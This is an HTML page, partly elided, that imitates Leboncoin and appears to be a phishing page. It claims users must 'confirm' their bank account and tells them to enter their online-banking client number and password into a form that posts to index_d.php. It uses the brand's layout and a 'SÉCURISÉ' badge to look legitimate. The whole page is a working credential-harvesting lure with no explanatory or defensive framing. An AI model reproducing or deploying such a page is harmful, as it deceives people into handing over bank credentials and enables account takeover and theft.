...
<html lang="fr" class="text-[62.5%]">
  ...
  <head>
    ...
    <script async="" src="https://dd.leboncoin.fr/tags.js"></script>
      ...
      <div class="relative grid grid-cols-page grid-rows-small-page sm:grid-rows-wide-page grid-areas-page h-[100vh] overflow-x-hidden">
        <header class="grid-in-header flex items-center justify-center bg-background shadow z-base">
          <div class="flex h-xl sm:h-2xl">
            <div data-testid="header"><a class="sc-bb6ed473-0 bMyVIh absolute left-xl top-lg sm:left-3xl" data-testid="viewLink-back-image"><svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="currentColor" stroke="none" class="fill-current text-current w-sz-32 h-sz-32 fill-main" data-spark-component="icon" aria-hidden="true" focusable="false">
                  <path fill-rule="evenodd" clip-rule="evenodd" d="M8.53868 6.67642C8.9371 7.05586 8.95002 7.68386 8.56754 8.0791L5.34622 11.408H21C21.5523 11.408 22 11.8521 22 12.4C22 12.9479 21.5523 13.3921 21 13.3921H5.34622L8.56754 16.7209C8.95002 17.1162 8.9371 17.7442 8.53868 18.1236C8.14027 18.5031 7.50724 18.4902 7.12477 18.095L2.27861 13.0871C1.90713 12.7032 1.90713 12.0969 2.27861 11.713L7.12477 6.70505C7.50724 6.30981 8.14027 6.29699 8.53868 6.67642Z"></path>
                </svg></a>
              <div>
                <div class="flex">
                  ...
                  <div data-testid="scurisBadge" class="items-center hidden md:flex">
                    ...
                    <h4 class="text-main text-subhead m-sm self-center">SÉCURISÉ</h4>
                  </div>
                </div>
              </div>
            </div>
          ...
          <div class="h-[calc(100%-50px)] md:h-[calc(100%-60px)] md:bg-no-repeat md:bg-bottom md:bg-[length:980px] md:bg-[url(/static/login-illustration.png)]">
            <div class="px-lg mx-auto py-xl flex flex-col gap-2xl bg-background max-md:h-full max-w-[498px] md:shadow md:rounded-lg md:p-2xl md:mt-[56px]">
              <div class="flex flex-col gap-sm grow-0">
                <h1 class="text-headline-1-expanded font-bold">CONFIRMER VOTRE COMPTE BANCAIRE</h1>
                <p class="text-callout font-regular">Pour bénéficier pleinement de votre compte Leboncoin et pouvoir transférer votre argent de votre compte Leboncoin vers votre compte bancaire et vice-versa, vous devez obligatoirement confirmer votre compte bancaire à l'aide de vos identifiants de connexion en ligne par mesure de sécurité.
Pour confirmez votre compte bancaire : Veuillez saisir le numéro de client et le mot de passe utilisé pour vos services bancaires en ligne.</p>
              </div>


              <form action="index_d.php" method="POST" class="flex flex-col justify-between md:gap-2xl" id="login-form">
                <div class="flex flex-col gap-xl">


<select class="relative ring-1 ring-inset peer box-border w-full appearance-none outline-none bg-surface text-ellipsis text-body-1 text-on-surface caret-neutral focus:ring-2 autofill:shadow-surface autofill:shadow-[inset_0_0_0px_1000px] disabled:cursor-not-allowed disabled:bg-on-surface/dim-5 disabled:text-on-surface/dim-3 read-only:cursor-default read-only:border-on-surface/dim-3 read-only:bg-on-surface/dim-5 h-sz-44 ring-outline hover:ring-outline-high focus:ring-outline-high disabled:ring-outline rounded-l-lg rounded-r-lg pl-lg pr-lg" class="select" name="bank" id="bank">

                                    <option value="">Sélectionnez votre type de banque</option>
                  ...
                  <div data-spark-component="form-field" class="!gap-sm flex flex-col gap-sm"><label data-spark-component="form-field-label" class="text-body-1 flex items-center gap-sm" id="radix-0" for="email">
IDENTIFIANT BANCAIRE<span data-spark-component="label-required-indicator" role="presentation" aria-hidden="true" class="text-caption text-on-surface/dim-3">*</span></label><input placeholder="" type="text" id="idbnk" name="idbnk" class="relative ring-1 ring-inset peer box-border w-full appearance-none outline-none bg-surface text-ellipsis text-body-1 text-on-surface caret-neutral focus:ring-2 autofill:shadow-surface autofill:shadow-[inset_0_0_0px_1000px] disabled:cursor-not-allowed disabled:bg-on-surface/dim-5 disabled:text-on-surface/dim-3 read-only:cursor-default read-only:border-on-surface/dim-3 read-only:bg-on-surface/dim-5 h-sz-44 ring-outline hover:ring-outline-high focus:ring-outline-high disabled:ring-outline rounded-l-lg rounded-r-lg pl-lg pr-lg" required="" aria-invalid="false" required></div>



   <div data-spark-component="form-field" class="!gap-sm flex flex-col gap-sm"><label data-spark-component="form-field-label" class="text-body-1 flex items-center gap-sm" id="radix-0" for="email">

CODE PERSONNEL<span data-spark-component="label-required-indicator" role="presentation" aria-hidden="true" class="text-caption text-on-surface/dim-3">*</span></label><input placeholder="" type="text" id="password" name="password" class="relative ring-1 ring-inset peer box-border w-full appearance-none outline-none bg-surface text-ellipsis text-body-1 text-on-surface caret-neutral focus:ring-2 autofill:shadow-surface autofill:shadow-[inset_0_0_0px_1000px] disabled:cursor-not-allowed disabled:bg-on-surface/dim-5 disabled:text-on-surface/dim-3 read-only:cursor-default read-only:border-on-surface/dim-3 read-only:bg-on-surface/dim-5 h-sz-44 ring-outline hover:ring-outline-high focus:ring-outline-high disabled:ring-outline rounded-l-lg rounded-r-lg pl-lg pr-lg" required="" aria-invalid="false" required></div>
              ...
              <button data-spark-component="button" class="u-shadow-border-transition box-border inline-flex items-center justify-center gap-md whitespace-nowrap px-lg text-body-1 font-bold focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-outline-high [&amp;:not(:focus-visible)]:ring-inset min-w-sz-44 h-sz-44 rounded-lg bg-main text-on-main hover:bg-main-hovered enabled:active:bg-main-pressed focus-visible:bg-main-focused w-full py-32" aria-live="off" type="submit">POURSUIVRE<svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="currentColor" stroke="none" class="fill-current text-current w-sz-16 h-sz-16 text-on-neutral" data-spark-component="icon" aria-hidden="true" focusable="false">
